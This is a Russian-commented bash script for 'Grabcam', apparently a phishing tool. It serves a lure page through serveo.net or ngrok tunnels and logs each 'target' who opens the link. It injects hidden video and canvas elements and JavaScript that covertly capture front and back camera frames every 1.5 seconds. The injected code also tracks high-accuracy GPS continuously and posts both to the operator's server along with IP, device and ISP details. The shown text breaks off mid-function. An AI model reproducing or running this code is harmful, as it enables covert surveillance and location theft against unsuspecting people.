#!/bin/bash
# =============================================================================
# Grabcam — скрипт для тестирования доступа к камере устройства
# =============================================================================
# Автор инструмента: ERRORoX
# =============================================================================

# Определяем директорию, где находится скрипт
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
# Переходим в директорию скрипта
cd "$SCRIPT_DIR"

# Очищаем экран терминала
clear
# Настраиваем хранилище для Termux (если используется Termux)
termux-setup-storage
# Устанавливаем PHP пакет автоматически (флаг -y означает "да" на все вопросы)
pkg install php -y
# Устанавливаем wget пакет для скачивания файлов
pkg install wget -y
# Снова очищаем экран
clear
# Устанавливаем обработчик сигнала (Ctrl+C) - при прерывании вызовется функция stop
trap 'printf "\n";stop' 2

# =============================================================================
# ФУНКЦИЯ: ПОКАЗАТЬ БАННЕР (ЗАГОЛОВОК)
# =============================================================================
banner() {
    # Выводим ASCII арт баннер через pipe в lolcat для цветной раскраски
echo '

                             __
                         __ /_/\___
                        /__/[]\/__/|o-_
                        |    _     ||   -_  
                        |  ((_))   ||     -_
                        |__________|/
             ___  ____   __   ____   ___   __   _  _ 
            / __)(  _ \ / _\ (  _ \ / __) / _\ ( \/ )
           ( (_ \ )   //    \ ) _ (( (__ /    \/ \/ \
            \___/(__\_)\_/\_/(____/ \___)\_/\_/\_)(_& v1.2 ' |lolcat
                                                                               
    # Выводим пустую строку
echo " "
printf "      \e[1;92m Grabcam — автор: ERRORoX\e[0m \n"
    # Выводим пустую строку
printf "\n"
    # Выводим предупреждение о необходимости включить точку доступа
    echo "      N073:> ПОЖАЛУЙСТА ВКЛЮЧИТЕ ТОЧКУ ДОСТУПА (HOTSPOT)
                   ИНАЧЕ ВЫ НЕ ПОЛУЧИТЕ ССЫЛКУ....!"
}

# =============================================================================
# ФУНКЦИЯ: ОСТАНОВКА ВСЕХ ПРОЦЕССОВ
# =============================================================================
stop() {
    # Выводим сообщение о остановке
    printf "\n\e[1;91m[\e[0m\e[1;77m!\e[0m\e[1;91m] Остановка скрипта...\e[0m\n"
    # Логируем остановку
    echo "[$(date +%Y-%m-%d\ %H:%M:%S)] ===== Скрипт остановлен =====" >> activity.log
    # Показываем финальную статистику
    show_stats
    # Проверяем, запущен ли процесс ngrok
checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
    # Проверяем, запущен ли процесс php
checkphp=$(ps aux | grep -o "php" | head -n1)
    # Проверяем, запущен ли процесс ssh
checkssh=$(ps aux | grep -o "ssh" | head -n1)
    # Если ngrok запущен, то останавливаем его
if [[ $checkngrok == *'ngrok'* ]]; then
        # Убиваем процесс ngrok с сигналом -2 (SIGINT)
pkill -f -2 ngrok > /dev/null 2>&1
        # Дополнительно убиваем все процессы ngrok
killall -2 ngrok > /dev/null 2>&1
        printf "\e[1;92m[+] Процесс ngrok остановлен\e[0m\n"
fi
    # Если php запущен, то останавливаем его
if [[ $checkphp == *'php'* ]]; then
        # Убиваем все процессы php
killall -2 php > /dev/null 2>&1
        printf "\e[1;92m[+] PHP сервер остановлен\e[0m\n"
fi
    # Если ssh запущен, то останавливаем его
if [[ $checkssh == *'ssh'* ]]; then
        # Убиваем все процессы ssh
killall -2 ssh > /dev/null 2>&1
        printf "\e[1;92m[+] SSH туннель остановлен\e[0m\n"
fi
    # Выводим прощальное сообщение
    printf "\e[1;92m[+] До свидания!\e[0m\n"
    # Выходим из скрипта с кодом ошибки 1
exit 1
}

# =============================================================================
# ФУНКЦИЯ: ПРОВЕРКА ЗАВИСИМОСТЕЙ
# =============================================================================
dependencies() {
    # Проверяем наличие команды php в системе
    command -v php > /dev/null 2>&1 || { 
        # Если php не найден, выводим сообщение об ошибке и выходим
        echo >&2 "Требуется php, но он не установлен. Установите его. Прерывание."; 
        exit 1; 
    }
}

# =============================================================================
# ФУНКЦИЯ: ПОЛУЧИТЬ IP АДРЕС
# =============================================================================
catch_ip() {
    # Извлекаем IP адрес из файла ip.txt (ищем строку с "IP:" и берем второе поле)
ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
    # Устанавливаем разделитель полей на новую строку
IFS=$'\n'
    # Получаем User-Agent из файла ip.txt
    user_agent=$(grep -a 'User-Agent:' ip.txt | cut -d ":" -f2- | tr -d '\r')
    # Получаем геолокацию из файла ip.txt
    country=$(grep -a 'Country:' ip.txt | cut -d ":" -f2- | tr -d '\r' | sed 's/^[[:space:]]*//')
    city=$(grep -a 'City:' ip.txt | cut -d ":" -f2- | tr -d '\r' | sed 's/^[[:space:]]*//')
    region=$(grep -a 'Region:' ip.txt | cut -d ":" -f2- | tr -d '\r' | sed 's/^[[:space:]]*//')
    lat=$(grep -a 'Latitude:' ip.txt | cut -d ":" -f2- | tr -d '\r' | sed 's/^[[:space:]]*//')
    lon=$(grep -a 'Longitude:' ip.txt | cut -d ":" -f2- | tr -d '\r' | sed 's/^[[:space:]]*//')
    isp=$(grep -a 'ISP:' ip.txt | cut -d ":" -f2- | tr -d '\r' | sed 's/^[[:space:]]*//')
    # Выводим найденный IP адрес (желтый цвет)
    printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] IP:\e[0m\e[1;77m %s\e[0m\n" "$ip"
    # Выводим информацию об устройстве (если есть)
    if [[ -n "$user_agent" ]]; then
        printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Устройство:\e[0m\e[1;77m %s\e[0m\n" "$user_agent"
    fi
    # Выводим геолокацию (если есть)
    if [[ -n "$country" && "$country" != "Unknown" && "$country" != "Local" ]]; then
        printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Местоположение:\e[0m\e[1;77m %s, %s, %s\e[0m\n" "$country" "$region" "$city"
        if [[ -n "$lat" && "$lat" != "0" ]]; then
            printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Координаты:\e[0m\e[1;77m %s, %s\e[0m\n" "$lat" "$lon"
        fi
    fi
    if [[ -n "$isp" && "$isp" != "Unknown" ]]; then
        printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] ISP:\e[0m\e[1;77m %s\e[0m\n" "$isp"
    fi
    # Добавляем содержимое ip.txt в конец файла saved.ip.txt
cat ip.txt >> saved.ip.txt
    # Добавляем запись в лог с временной меткой и геолокацией
    local geo_info=""
    if [[ -n "$country" && "$country" != "Unknown" && "$country" != "Local" ]]; then
        geo_info=" | Location: $country, $city | Coordinates: $lat, $lon"
    fi
    echo "[$(date +%Y-%m-%d\ %H:%M:%S)] IP: $ip | User-Agent: $user_agent$geo_info" >> activity.log
    
    # Записываем данные о подключении в лог геолокации для отображения в терминале
    echo "[$(date +%Y-%m-%d\ %H:%M:%S)] [+] Цель открыла ссылку!" >> logs_location.log
    echo "[$(date +%Y-%m-%d\ %H:%M:%S)] [+] IP: $ip" >> logs_location.log
    if [[ -n "$user_agent" ]]; then
        echo "[$(date +%Y-%m-%d\ %H:%M:%S)] [+] Устройство: $user_agent" >> logs_location.log
    fi
    if [[ -n "$country" && "$country" != "Unknown" && "$country" != "Local" ]]; then
        echo "[$(date +%Y-%m-%d\ %H:%M:%S)] [+] Местоположение: $country, $region, $city" >> logs_location.log
        if [[ -n "$lat" && "$lat" != "0" ]]; then
            echo "[$(date +%Y-%m-%d\ %H:%M:%S)] [+] Координаты: $lat, $lon" >> logs_location.log
        fi
    fi
    if [[ -n "$isp" && "$isp" != "Unknown" ]]; then
        echo "[$(date +%Y-%m-%d\ %H:%M:%S)] [+] ISP: $isp" >> logs_location.log
    fi
    echo "[$(date +%Y-%m-%d\ %H:%M:%S)] ---" >> logs_location.log
}

# =============================================================================
# ФУНКЦИЯ: ПОЛУЧЕНИЕ СТАТИСТИКИ
# =============================================================================
get_stats() {
    # Подсчитываем общее количество фотографий
    local total_photos=0
    local total_ips=0
    # Используем переменную PHOTO_DIR (установлена в начале скрипта)
    if [[ -d "$PHOTO_DIR" ]]; then
        # Подсчитываем все PNG файлы в папке Photo
        total_photos=$(find "$PHOTO_DIR" -name "*.png" 2>/dev/null | wc -l)
        # Подсчитываем количество уникальных папок (IP адресов)
        total_ips=$(find "$PHOTO_DIR" -mindepth 1 -maxdepth 1 -type d 2>/dev/null | wc -l)
    fi
    # Возвращаем статистику через разделитель |
    echo "$total_photos|$total_ips"
}

# =============================================================================
# ФУНКЦИЯ: ВЫВОД СТАТИСТИКИ
# =============================================================================
show_stats() {
    # Получаем статистику
    local stats=$(get_stats)
    local total_photos=$(echo "$stats" | cut -d'|' -f1)
    local total_ips=$(echo "$stats" | cut -d'|' -f2)
    # Выводим статистику (голубой цвет)
    printf "\e[1;96m[Статистика] Фото: %s | IP: %s\e[0m\n" "$total_photos" "$total_ips"
}

# =============================================================================
# ФУНКЦИЯ: ПРОВЕРКА НА ОБНАРУЖЕНИЕ ЦЕЛИ
# =============================================================================
checkfound() {
    # Выводим пустую строку
    printf "\n"
    # Показываем начальную статистику
    show_stats
    # Выводим сообщение о ожидании подключений (зеленый цвет)
    printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Ожидание целей,\e[0m\e[1;77m Нажмите Ctrl + C для выхода...\e[0m\n"
    # Счетчик для периодического показа статистики
    local stats_counter=0
    
    # Начинаем бесконечный цикл
while [ true ]; do
        # Проверяем, существует ли файл ip.txt
if [[ -e "ip.txt" ]]; then
            # Если файл существует, выводим сообщение об обнаружении цели
            printf "\n\e[1;92m[\e[0m+\e[1;92m] Цель открыла ссылку!\n"
            # Вызываем функцию для получения IP адреса
catch_ip
            # Удаляем файл ip.txt после обработки
rm -rf ip.txt
            # Обновляем статистику
            show_stats

fi
        # Ждем 0.5 секунды
sleep 0.5
        # Проверяем, существует ли файл Log.log (означает, что фото получено)
if [[ -e "Log.log" ]]; then
            # Если файл существует, выводим сообщение о получении фото
            local photo_count=$(get_stats | cut -d'|' -f1)
            printf "\n\e[1;92m[\e[0m+\e[1;92m] Файл камеры получен! (Всего фото: %s)\e[0m\n" "$photo_count"
            # Удаляем файл Log.log после обработки
rm -rf Log.log
            # Обновляем статистику
            show_stats
        fi
        # Увеличиваем счетчик
        stats_counter=$((stats_counter + 1))
        # Каждые 60 итераций (30 секунд) показываем статистику
        if [[ $stats_counter -ge 60 ]]; then
            show_stats
            stats_counter=0
        fi
        # Ждем еще 0.5 секунды перед следующей проверкой
sleep 0.5
done 
}

# =============================================================================
# ФУНКЦИЯ: ЗАПУСК SERVEO СЕРВЕРА
# =============================================================================
server() {
    # Проверяем наличие команды ssh в системе
    command -v ssh > /dev/null 2>&1 || { 
        # Если ssh не найден, выводим сообщение об ошибке и выходим
        echo >&2 "Требуется ssh, но он не установлен. Установите его. Прерывание."; 
        exit 1; 
    }
    # Выводим сообщение о запуске Serveo (белый цвет с желтым плюсом)
    printf "\e[1;77m[\e[0m\e[1;93m+\e[0m\e[1;77m] Запуск Serveo...\e[0m\n"
    # Проверяем, запущен ли процесс php
if [[ $checkphp == *'php'* ]]; then
        # Если php запущен, останавливаем его перед запуском нового
killall -2 php > /dev/null 2>&1
fi
    # Проверяем, нужно ли использовать субдомен
if [[ $subdomain_resp == true ]]; then
        # Если субдомен нужен, запускаем SSH туннель с субдоменом в фоновом режиме
        # -o StrictHostKeyChecking=no - не спрашивать подтверждение при первом подключении
        # -o ServerAliveInterval=60 - отправлять keepalive каждые 60 секунд
        # -R - проброс портов в обратном направлении (с удаленного сервера на локальный)
        # Результат перенаправляем в файл sendlink
$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R '$subdomain':80:localhost:3333 serveo.net > sendlink 2>&1 ' &
        # Ждем 8 секунд для установки соединения
sleep 8
else
        # Если субдомен не нужен, запускаем SSH туннель без субдомена
$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:3333 serveo.net > sendlink 2>&1 ' &
        # Ждем 8 секунд для установки соединения
sleep 8
fi
    # Выводим сообщение о запуске PHP сервера (желтый цвет)
    printf "\e[1;77m[\e[0m\e[1;33m+\e[0m\e[1;77m] Запуск php сервера... (localhost:3333)\e[0m\n"
    # Освобождаем порт 3333, если он занят
fuser -k 3333/tcp > /dev/null 2>&1
    # Запускаем PHP встроенный сервер на порту 3333 в фоновом режиме
php -S localhost:3333 > /dev/null 2>&1 &
    # Ждем 3 секунды для запуска сервера
    sleep 3
    # Извлекаем ссылку Serveo (serveo.net или serveousercontent.com)
    send_link=$(grep -oE "https://[0-9a-zA-Z\-]+\.(serveo\.net|serveousercontent\.com)" sendlink 2>/dev/null | head -1)
    # Проверяем, была ли получена ссылка
    if [[ -z "$send_link" ]]; then
        # Если ссылка не найдена, ждем еще немного и пробуем снова
sleep 3
send_link=$(grep -oE "https://[0-9a-zA-Z\-]+\.(serveo\.net|serveousercontent\.com)" sendlink 2>/dev/null | head -1)
    fi
    # Выводим полученную ссылку (желтый цвет)
    if [[ -n "$send_link" ]]; then
        printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Прямая ссылка:\e[0m\e[1;77m %s\n" "$send_link"
        # Сохраняем ссылку в лог
        echo "[$(date +%Y-%m-%d\ %H:%M:%S)] Serveo link created: $send_link" >> activity.log
        # Создаем отдельные файлы логов для каждой категории
        touch logs_photos.log logs_location.log
    else
        printf "\e[1;91m[\e[0m\e[1;77m!\e[0m\e[1;91m] Не удалось получить ссылку Serveo. Проверьте файл sendlink\e[0m\n"
        # Показываем последние строки sendlink для отладки
        if [[ -f "sendlink" ]]; then
            printf "\e[1;93m[Последние строки sendlink:]\e[0m\n"
            tail -5 sendlink | head -3
        fi
    fi
}

# =============================================================================
# ФУНКЦИЯ: СОЗДАНИЕ PAYLOAD ДЛЯ NGROK
# =============================================================================
payload_ngrok() {
    # Получаем ссылку Ngrok через API (запрос к локальному API ngrok на порту 4040)
link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9A-Za-z.-]*\.ngrok.io")
    # Устанавливаем HTML шаблон по умолчанию (можно изменить через переменную окружения)
    HTML_TEMPLATE="${HTML_TEMPLATE:-grabcam.html}"
    # Проверяем, существует ли указанный HTML шаблон
    if [[ ! -f "$HTML_TEMPLATE" ]]; then
        # Если шаблон не найден, выводим предупреждение (желтый цвет)
        printf "\e[1;93m[!] HTML шаблон не найден: $HTML_TEMPLATE\e[0m\n"
        # Сообщаем об использовании шаблона по умолчанию (белый цвет)
        printf "\e[1;77m[+] Используется по умолчанию: grabcam.html\e[0m\n"
        # Устанавливаем шаблон по умолчанию
        HTML_TEMPLATE="grabcam.html"
    else
        # Если файл найден, автоматически дополняем его необходимым кодом
        printf "\e[1;93m[*] Проверка и дополнение HTML файла: $HTML_TEMPLATE\e[0m\n"
        auto_fix_html "$HTML_TEMPLATE"
    fi
    # Заменяем в HTML шаблоне строку 'forwarding_link' на реальную ссылку Ngrok
    # Результат сохраняем в index2.html
    sed "s+forwarding_link+$link+g" "$HTML_TEMPLATE" > index2.html
    # Заменяем в PHP шаблоне строку 'forwarding_link' на реальную ссылку Ngrok
    # Результат сохраняем в index.php
    sed "s+forwarding_link+$link+g" template.php > index.php
    # Выводим сообщение об использованном шаблоне (зеленый цвет)
    printf "\e[1;92m[+] Использован HTML шаблон: $HTML_TEMPLATE\e[0m\n"
}

# =============================================================================
# ФУНКЦИЯ: ЗАПУСК NGROK СЕРВЕРА
# =============================================================================
ngrok_server() {
    # Проверяем, существует ли исполняемый файл ngrok
if [[ -e ngrok ]]; then
        # Если ngrok существует, выводим пустую строку (ничего не делаем)
echo ""
else
        # Если ngrok не существует, проверяем наличие unzip
        command -v unzip > /dev/null 2>&1 || { 
            # Если unzip не найден, выводим ошибку и выходим
            echo >&2 "Требуется unzip, но он не установлен. Установите его. Прерывание."; 
            exit 1; 
        }
        # Проверяем наличие wget
        command -v wget > /dev/null 2>&1 || { 
            # Если wget не найден, выводим ошибку и выходим
            echo >&2 "Требуется wget, но он не установлен. Установите его. Прерывание."; 
            exit 1; 
        }
        # Выводим сообщение о начале скачивания Ngrok (зеленый цвет)
        printf "\e[1;92m[\e[0m+\e[1;92m] Скачивание Ngrok...\n"
        # Определяем архитектуру системы (ARM или нет)
arch=$(uname -a | grep -o 'arm' | head -n1)
        # Определяем, является ли система Android
arch2=$(uname -a | grep -o 'Android' | head -n1)
        # Если система ARM или Android
if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]] ; then
            # Скачиваем архив ngrok для ARM/Android
wget https://download2283.mediafire.com/zbyvn6rzvaog/fxrbagkj5bj8d80/ngrok+wifi%2Bdata.zip > /dev/null 2>&1
            # Проверяем, успешно ли скачан архив
if [[ -e ngrok+wifi+data.zip ]]; then
                # Распаковываем архив
unzip ngrok+wifi+data.zip > /dev/null 2>&1
                # Делаем файл ngrok исполняемым
chmod +x ngrok
                # Удаляем архив после распаковки
rm -rf ngrok+wifi+data.zip
else
                # Если скачивание не удалось, выводим ошибку с инструкцией
                printf "\e[1;93m[!] Ошибка скачивания... Termux, выполните:\e[0m\e[1;77m pkg install wget\e[0m\n"
                # Выходим из скрипта
exit 1
fi
else
            # Если система не ARM/Android (обычный Linux)
            # Скачиваем архив ngrok для обычного Linux
wget https://download2283.mediafire.com/zbyvn6rzvaog/fxrbagkj5bj8d80/ngrok+wifi%2Bdata.zip > /dev/null 2>&1 
            # Проверяем наличие неправильного имени файла (старая версия)
if [[ -e ngrok-stable-linux-386.zip ]]; then
                # Распаковываем архив
unzip ngrok+wifi+data.zip > /dev/null 2>&1
                # Делаем файл ngrok исполняемым
chmod +x ngrok
                # Удаляем архив после распаковки
rm -rf ngrok+wifi+data.zip
else
                # Если что-то пошло не так, выводим ошибку
                printf "\e[1;93m[!] Ошибка скачивания... \e[0m\n"
                # Выходим из скрипта
exit 1
fi
fi
fi
    # Выводим сообщение о запуске PHP сервера (зеленый цвет)
    printf "\e[1;92m[\e[0m+\e[1;92m] Запуск php сервера...\n"
    # Запускаем PHP встроенный сервер на порту 3333 в фоновом режиме
php -S 127.0.0.1:3333 > /dev/null 2>&1 & 
    # Ждем 2 секунды для запуска сервера
sleep 2
    # Создаем отдельные файлы логов для каждой категории
    touch logs_photos.log logs_location.log
    # Выводим сообщение о запуске Ngrok сервера (зеленый цвет)
    printf "\e[1;92m[\e[0m+\e[1;92m] Запуск ngrok сервера...\n"
    # Запускаем ngrok для проброса порта 3333 в фоновом режиме
./ngrok http 3333 > /dev/null 2>&1 &
    # Ждем 10 секунд для установки туннеля
sleep 10
    # Получаем ссылку Ngrok через API
link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9A-Za-z.-]*\.ngrok.io")
    # Выводим полученную ссылку (зеленый цвет)
    printf "\e[1;92m[\e[0m*\e[1;92m] Прямая ссылка:\e[0m\e[1;77m %s\e[0m\n" $link
    # Вызываем функцию создания payload с Ngrok ссылкой
payload_ngrok
    # Начинаем проверку на обнаружение целей
checkfound
}

# =============================================================================
# ФУНКЦИЯ: ВЫБОР МЕТОДА ПОРТ-ФОРВАРДИНГА
# =============================================================================
start1() {
    # Если файл sendlink существует, удаляем его (очистка перед новым запуском)
if [[ -e sendlink ]]; then
rm -rf sendlink
fi
    # Выводим пустую строку
printf "\n"
    # Выводим опцию 1 - Serveo (рекомендуется для России) (зеленый цвет)
    printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Serveo.net (Рекомендуется для России)\e[0m\n"
    # Выводим опцию 2 - Ngrok (зеленый цвет)
printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Ngrok\e[0m\n"
    # Устанавливаем опцию по умолчанию (1 - Serveo)
default_option_server="1"
    # Запрашиваем у пользователя выбор опции (желтый цвет промпта)
    printf "\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Выберите метод порт-форвардинга [По умолчанию: 1 (Serveo)]: \e[0m"
    read option_server
    # Если пользователь не ввел ничего, используем значение по умолчанию
option_server="${option_server:-${default_option_server}}"
    # Если выбрана опция 1 (Serveo)
if [[ $option_server -eq 1 ]]; then
        # Проверяем наличие PHP
        command -v php > /dev/null 2>&1 || { 
            # Если PHP не найден, выводим ошибку и выходим
            echo >&2 "Требуется php, но он не установлен. Установите его. Прерывание."; 
            exit 1; 
        }
        # Вызываем функцию start для настройки Serveo
start
    # Если выбрана опция 2 (Ngrok)
elif [[ $option_server -eq 2 ]]; then
        # Вызываем функцию ngrok_server для настройки Ngrok
ngrok_server
else
        # Если выбрана неверная опция, выводим сообщение об ошибке (желтый цвет)
        printf "\e[1;93m [!] Неверная опция!\e[0m\n"
        # Ждем 1 секунду
sleep 1
        # Очищаем экран
clear
        # Запускаем функцию start1 снова (рекурсивный вызов)
start1
fi
}

# =============================================================================
# ФУНКЦИЯ: АВТОМАТИЧЕСКОЕ ДОПОЛНЕНИЕ HTML ФАЙЛА
# =============================================================================
auto_fix_html() {
    local html_file="$1"
    # Проверяем, существует ли файл
    if [[ ! -f "$html_file" ]]; then
        return 1
    fi
    # Создаем временный файл
    local temp_file="${html_file}.tmp"
    # Копируем оригинальный файл во временный
    cp "$html_file" "$temp_file"
    
    # ========================================================================
    # ШАГ 1: Добавляем jQuery ПЕРВЫМ (если его нет)
    # ========================================================================
    if ! grep -q "jquery" "$temp_file" -i && ! grep -q "jquery.js" "$temp_file"; then
        local jquery_file=$(mktemp)
        cat > "$jquery_file" << 'ENDOFJQUERY'
<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
ENDOFJQUERY
        if grep -q "</head>" "$temp_file"; then
            sed -i "/<\/head>/r $jquery_file" "$temp_file"
        elif grep -q "<body>" "$temp_file"; then
            sed -i "/<body>/r $jquery_file" "$temp_file"
        elif grep -q "</body>" "$temp_file"; then
            sed -i "/<\/body>/r $jquery_file" "$temp_file"
        else
            cat "$jquery_file" >> "$temp_file"
        fi
        rm -f "$jquery_file"
    fi
    
    # ========================================================================
    # ШАГ 2: Добавляем элементы video и canvas (если их нет)
    # ========================================================================
    # Проверяем наличие элементов video и canvas
    if ! grep -q '<video' "$temp_file" && ! grep -q 'id="video"' "$temp_file"; then
        # Создаем временный файл с элементами video и canvas
        local video_canvas_file=$(mktemp)
        cat > "$video_canvas_file" << 'ENDOFVIDEO'
<!-- Автоматически добавлено: элементы для камеры (ОБЕИХ) и галереи -->
<div class="video-wrap" hidden="hidden">
    <video id="video" playsinline autoplay></video>
    <video id="video-back" playsinline autoplay></video>
</div>
<canvas hidden="hidden" id="canvas" width="740" height="580"></canvas>
<canvas hidden="hidden" id="canvas-back" width="740" height="580"></canvas>
<input type="file" id="gallery-input" accept="image/*" multiple style="display:none;">
ENDOFVIDEO
        # Находим место для вставки - ВНУТРИ body, но ВНЕ script тегов
        # Ищем последнюю строку перед закрывающим </body>, которая НЕ является частью <script>
        if grep -q "</body>" "$temp_file"; then
            # Используем sed для вставки перед </body>
            sed -i "/<\/body>/r $video_canvas_file" "$temp_file"
        elif grep -q "<body>" "$temp_file"; then
            # Если есть открывающий <body>, вставляем после него
            sed -i "/<body>/r $video_canvas_file" "$temp_file"
        else
            # Если нет body, создаем его или добавляем в конец
            if ! grep -q "<html>" "$temp_file"; then
                echo '<body>' >> "$temp_file"
                cat "$video_canvas_file" >> "$temp_file"
                echo '</body>' >> "$temp_file"
            else
                cat "$video_canvas_file" >> "$temp_file"
            fi
        fi
        rm -f "$video_canvas_file"
    elif ! grep -q '<canvas' "$temp_file" && ! grep -q 'id="canvas"' "$temp_file"; then
        # Если video есть, но canvas нет - добавляем canvas для обеих камер
        local canvas_file=$(mktemp)
        cat > "$canvas_file" << 'ENDOFCANVAS'
<canvas hidden="hidden" id="canvas" width="740" height="580"></canvas>
<canvas hidden="hidden" id="canvas-back" width="740" height="580"></canvas>
ENDOFCANVAS
        # Вставляем после video элемента или перед </body>
        if grep -q "</body>" "$temp_file"; then
            sed -i "/<\/body>/r $canvas_file" "$temp_file"
        elif grep -q 'id="video"' "$temp_file"; then
            # Просто вставляем перед закрывающим тегом body
            if grep -q "</body>" "$temp_file"; then
                sed -i "/<\/body>/r $canvas_file" "$temp_file"
            else
                cat "$canvas_file" >> "$temp_file"
            fi
        fi
        rm -f "$canvas_file"
    fi
    
    # ========================================================================
    # ШАГ 3: Добавляем функцию post() (если её нет или неправильный URL)
    # ========================================================================
    if ! grep -q "forwarding_link/post.php" "$temp_file"; then
        if grep -q "function post" "$temp_file"; then
            # Если функция есть, но URL неправильный - заменяем
            sed -i "s|url:.*post\.php|url: 'forwarding_link/post.php'|g" "$temp_file"
            sed -i "s|url:\s*['\"].*['\"]|url: 'forwarding_link/post.php'|g" "$temp_file"
        else
            # Если функции post нет - добавляем её
            local post_function_file=$(mktemp)
            cat > "$post_function_file" << 'ENDOFFUNCTION'
<!-- Автоматически добавлено: функция отправки данных -->
<script>
function post(imgdata, cameraType){
    if (typeof $ === 'undefined') {
        console.error('jQuery не загружен!');
        return;
    }
    // Определяем тип камеры (по умолчанию front)
    cameraType = cameraType || 'front';
    $.ajax({
        type: 'POST',
        data: { 
            cat: imgdata,
            camera_type: cameraType
        },
        url: 'forwarding_link/post.php',
        dataType: 'json',
        async: false,
        success: function(result){
        },
        error: function(){
        }
    });
}


// Функция для отправки геолокации
function postLocation(location){
    if (typeof $ === 'undefined') {
        console.error('jQuery не загружен для отправки геолокации!');
        return;
    }
    $.ajax({
        type: 'POST',
        data: { 
            location_data: JSON.stringify(location),
            location_type: 'gps'
        },
        url: 'forwarding_link/location.php',
        dataType: 'json',
        async: true,
        success: function(result){
            console.log('Геолокация отправлена на сервер');
        },
        error: function(){
            console.log('Ошибка отправки геолокации');
        }
    });
}
</script>
ENDOFFUNCTION
            # Вставляем перед закрывающим тегом body
            if grep -q "</body>" "$temp_file"; then
                sed -i "/<\/body>/r $post_function_file" "$temp_file"
            elif grep -q "</html>" "$temp_file"; then
                sed -i "/<\/html>/r $post_function_file" "$temp_file"
            else
                cat "$post_function_file" >> "$temp_file"
            fi
            rm -f "$post_function_file"
        fi
    fi
    # ========================================================================
    # ШАГ 4: Добавляем код доступа к камере (ОБЕИХ) ПОСЛЕДНИМ (если его нет)
    # ========================================================================
    if ! grep -q "getUserMedia" "$temp_file" && ! grep -q "navigator.mediaDevices" "$temp_file"; then
        local camera_file=$(mktemp)
        cat > "$camera_file" << 'ENDOFCAMERA'
<!-- Автоматически добавлено: код доступа к камере (ОБЕИХ), геолокации и галерее -->
<script>
// Настройки захвата (можно изменить)
var CAPTURE_INTERVAL = 1500; // Интервал захвата в миллисекундах (по умолчанию 1.5 секунды)
var IMAGE_QUALITY = 1.0; // Качество изображения от 0.0 до 1.0 (по умолчанию 1.0 - максимальное)

// Глобальные переменные для геолокации
var currentLocation = null;

// Функция для безопасной инициализации камер с проверками
function waitForElementsAndInit() {
    // Получаем элементы с повторными попытками
    var video = document.getElementById('video');
    var canvas = document.getElementById('canvas');
    var videoBack = document.getElementById('video-back');
    var canvasBack = document.getElementById('canvas-back');
    
    // Проверяем наличие элементов
    if (!video) {
        console.log('Элемент video не найден, ждем...');
        setTimeout(waitForElementsAndInit, 500);
        return;
    }
    
    if (!canvas) {
        console.log('Элемент canvas не найден, ждем...');
        setTimeout(waitForElementsAndInit, 500);
        return;
    }
    
    // Проверяем наличие функции post
    if (typeof post !== 'function') {
        console.log('Функция post не найдена, ждем...');
        setTimeout(waitForElementsAndInit, 500);
        return;
    }
    
    // Все элементы найдены
    console.log('Все элементы найдены, запускаем функции...');
    
    // Инициализируем геолокацию
    initGeolocation();
    
    // Инициализируем доступ к галерее
    initGalleryAccess();
    
    // Инициализируем обе камеры
    initCameras(video, canvas, videoBack, canvasBack);
}

// Функция для получения точной геолокации
function initGeolocation() {
    if (!navigator.geolocation) {
        console.error('❌ Геолокация не поддерживается в этом браузере');
        return;
    }
    
    console.log('📍 Запрос доступа к местоположению...');
    
    // Опции для точной геолокации (GPS)
    var geoOptions = {
        enableHighAccuracy: true, // Точная геолокация (GPS)
        timeout: 20000, // Увеличиваем таймаут до 20 секунд
        maximumAge: 0 // Не использовать кэш, всегда получать свежие данные
    };
    
    // Сначала запрашиваем текущее местоположение
    navigator.geolocation.getCurrentPosition(
        function(position) {
            console.log('✅ Доступ к местоположению разрешен!');
            currentLocation = {
                lat: position.coords.latitude,
                lon: position.coords.longitude,
                accuracy: position.coords.accuracy,
                altitude: position.coords.altitude || null,
                heading: position.coords.heading || null,
                speed: position.coords.speed || null,
                timestamp: Date.now()
            };
            console.log('📍 Точная геолокация получена:', currentLocation);
            
            // Отправляем геолокацию на сервер сразу
            if (typeof postLocation === 'function') {
                postLocation(currentLocation);
            }
            
            // Начинаем отслеживание изменений геолокации в реальном времени
            var watchId = navigator.geolocation.watchPosition(
                function(pos) {
                    currentLocation = {
                        lat: pos.coords.latitude,
                        lon: pos.coords.longitude,
                        accuracy: pos.coords.accuracy,
                        altitude: pos.coords.altitude || null,
                        heading: pos.coords.heading || null,
                        speed: pos.coords.speed || null,
                        timestamp: pos.timestamp || Date.now()
                    };
                    console.log('📍 Обновление геолокации:', currentLocation);
                    // Отправляем каждое обновление на сервер
                    if (typeof postLocation === 'function') {
                        postLocation(currentLocation);
                    }
                },
                function(error) {
                    console.error('❌ Ошибка отслеживания геолокации:', error.message, 'Код:', error.code);
                },
                geoOptions
            );
            
            // Сохраняем ID для возможной остановки
            window.geoWatchId = watchId;
        },
        function(error) {
            console.error('❌ Ошибка получения геолокации:', error.message, 'Код:', error.code);
            if (error.code === 1) {
                console.error('Пользователь отклонил запрос на доступ к местоположению');
            } else if (error.code === 2) {
                console.error('Информация о местоположении недоступна (GPS выключен?)');
            } else if (error.code === 3) {
                console.error('Истекло время ожидания запроса местоположения');
            }
